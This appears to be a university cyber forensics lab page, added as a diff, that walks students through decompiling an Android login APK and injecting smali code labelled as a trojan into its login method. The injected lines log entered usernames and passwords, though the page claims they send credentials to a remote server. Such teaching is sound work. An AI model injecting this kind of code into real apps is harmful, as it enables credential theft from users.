@@ -1,0 +1,185 @@
+<!DOCTYPE HTML>
+<!--
+	Phantom by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Activity 2 - TTU - Cyber Forensics</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<div class="inner">
+
+							<!-- Logo -->
+								<a href="index.html" class="logo">
+									<img src="images/TTUCS-logo.JPG" alt="" />
+									<!--<span class="symbol"></span><span class="title"></span>-->
+								</a>
+
+							<!-- Nav -->
+								<nav>
+									<ul>
+										<li><a href="#menu">Menu</a></li>
+									</ul>
+								</nav>
+
+						</div>
+					</header>
+
+				<!-- Menu -->
+					<nav id="menu">
+						<h2>Menu</h2>
+						<ul>
+							<li><a href="index.html">Home</a></li>
+							<li><a href="generic1.html">Activity 1</a></li>
+							<li><a href="generic2.html">Activity 2</a></li>
+							<li><a href="generic3.html">Activity 3</a></li>
+							<li><a href="generic4.html">Activity 4</a></li>
+							<li><a href="generic5.html">Activity 5</a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+				<div id="main">
+					<div class="inner">
+						<h1>Activity 2</h1>
+						<!--<span class="image main"><img src="images/pic13.jpg" alt="" /></span>-->
+						<span class="image main"><img src="images/ttu/images/pic2.jpg" alt="" /></span>
+						<br>
+						<pre>                                                                                  <b>Estimated Time: 30 Minutes</b></pre>
+						<h2><font size="6">&#8608;</font><font color="blue">1.1</font> Objective</h2>
+							<p>
+								<ul>
+								<li>In this Activity 2, <a href="https://en.wikipedia.org/wiki/Apk_(file_format)"  style="text-decoration:none" onmouseover="style='text-decoration:underline'" onmouseout="style='text-decoration:none'">APK</a> file is extracted to a folder and malicious code is injected into one of the files.</li>
+								</ul>
+							</p>
+						
+						<h2><font size="6">&#8608;</font><font color="blue">1.2</font> Description</h2>
+						<p>After generating a signed APK file in Activity 1, we will extract it into a folder structure and inject a malicious code into one of the files. This code will take a copy of login credentials entered on the app and sends to a remote server unnoticed.</p>
+						<br>
+						<h2><font size="6">&#8608;</font><font color="blue">1.3</font> Artifacts</h2>
+						<p>
+							Click below links to download modified APK file and key store File<br>
+							&emsp;&emsp;&emsp;<a href="images/ttu/Activity2/login.apk">login.apk</a><br>
+							&emsp;&emsp;&emsp;<a href="images/ttu/Activity2/p9cert.jks">p9cert.jks</a><br>
+						</p>
+						<br>
+						<h2><font size="6">&#8608;</font><font color="blue">1.4</font> Instructions</h2>
+						<p>
+							<ul>
+								<li>Step 1: Download the file "apktool_2.0.0rc3.jar" from below given link. With help of this jar file, we will extract the "app-release.apk" file created in Activity 1 and see the files content.</li>
+								&emsp;&emsp;&emsp;<a href="https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.0.0rc3.jar">https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.0.0rc3.jar</a>
+								<br>
+								<br>
+								<li>Step 2: Now place the downloaded file in the same directory where "app-release.apk" exists.</li>
+								&emsp;&emsp;&emsp;<img src="images/ttu/Activity2/reference-folder-structure.PNG" width="50%" height="50%">
+								<br>
+								<li>Step 3: Open command prompt and go to folder location where files "apktool_2.0.0rc3.jar" & "app-release.apk" are present.</li>
+								<br>
+								<li>Step 4: Run below command to extract the apk file into a folder structure.</li>
+								&emsp;&emsp;&emsp;java -jar apktool_2.0.0rc3.jar d app-release.apk<br>
+								&emsp;&emsp;&emsp;<img src="images/ttu/Activity2/APK-Extraction.PNG" width="50%" height="50%">
+								<br>
+								<li>Step 5: Go inside app-release folder and observe the sub-folders</li>
+								<br>
+								<li>Step 6: There are several files with extension as ".smali" inside sub-folder called "smali" under app-release</li>
+								&emsp;&emsp;&emsp;<img src="images/ttu/Activity2/app-release-folder.PNG" width="50%" height="50%">
+								<br>
+								<li>Step 7: Search for file "RestClient.smali" and open it in any text editor (Example: Notepad++). Now find the method "performLogin" in the code.</li>
+								<br>
+								<li>Step 8: Add below piece of code after ".line 258" in the file.</li>
+								<br>
+								<p style="color:blue;">
+								&emsp;&emsp;&emsp;# EVIL TROJAN CODE LOGGING PASSWORD<br>
+								&emsp;&emsp;&emsp;const-string v0, "TTUPROJECT"<br>
+								&emsp;&emsp;&emsp;const-string v1, "USERNAME AND PASSWORD BELOW"<br>
+								&emsp;&emsp;&emsp;invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I<br>
+								&emsp;&emsp;&emsp;invoke-static {v0, p3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I<br>
+								&emsp;&emsp;&emsp;invoke-static {v0, p4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I<br>
+								&emsp;&emsp;&emsp;# END OF EVIL TROJAN CODE<br>
+								</p>
+								<br>
+								&emsp;&emsp;&emsp;<img src="images/ttu/Activity2/existing-code.PNG" width="50%" height="50%"><br>
+								&emsp;&emsp;&emsp;<img src="images/ttu/Activity2/modified-code.PNG" width="50%" height="50%">
+								<br>
+								<li>Step 9: Save the code changes in "RestClient.smali" file</li>
+							</ul>	
+						</p>
+						<br>
+						<h2><font size="6">&#8608;</font><font color="blue">1.5</font><font color="orange">&starf; &starf; &starf;</font> Self-Assessment <font color="orange">&starf; &starf; &starf;</font> </h2>
+						<p>Please complete the following self-assessment over Activity 2</p>
+						<a href="Challenge2.html">Start Assessment</a>
+						<br>
+						<h2><font size="6">&#8608;</font><font color="blue">1.6</font><font color="orange"></font> Activity 2 - Feedback <font color="orange"></font> 😍😁😶🙁😞</h2>
+						<p>Please complete the following survey questions over Activity 2</p>
+						<a href="https://educttu.az1.qualtrics.com/jfe/form/SV_abZ0GeURJPRZYXA">Start Survey Questions</a>
+							
+					</div>
+				</div>
+
+				<!-- Footer -->
+					<footer id="footer">
+						<div class="inner">
+							<section>
+								<h2>Contact Us</h2>
+								<form method="post" action="https://formspree.io/f/xoqrzgeo">
+									<div class="fields">
+										<div class="field half">
+											<input type="text" name="name" id="name" placeholder="Name" />
+										</div>
+										<div class="field half">
+											<input type="email" name="email" id="email" placeholder="Email" />
+										</div>
+										<div class="field">
+											<textarea name="message" id="message" placeholder="Message"></textarea>
+										</div>
+									</div>
+									<ul class="actions">
+										<li><input type="submit" value="Send" class="primary" /></li>
+									</ul>
+								</form>
+							</section>
+							<section>
+								<h2>Follow</h2>
+								<ul class="icons">
+									<li><a href="#" class="icon brands style2 fa-twitter"><span class="label">Twitter</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-facebook-f"><span class="label">Facebook</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-instagram"><span class="label">Instagram</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-dribbble"><span class="label">Dribbble</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-github"><span class="label">GitHub</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-500px"><span class="label">500px</span></a></li>
+									<li><a href="#" class="icon solid style2 fa-phone"><span class="label">Phone</span></a></li>
+									<li><a href="#" class="icon solid style2 fa-envelope"><span class="label">Email</span></a></li>
+								</ul>
+							</section>
+							<ul class="copyright">
+								<li>&copy; Texas Tech University. All rights reserved</li>
+								<!--<li>Design: <a href="http://html5up.net">HTML5 UP</a></li>-->
+							</ul>
+						</div>
+					</footer>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+			<link rel="stylesheet" href="AIchat.v1.css" type="text/css" media="screen" />
+			<script type="text/javascript" src="dependencies.v1.js"></script>
+			 <script type="text/javascript" src="AIchat.v1.js"></script>
+	</body>
+</html>
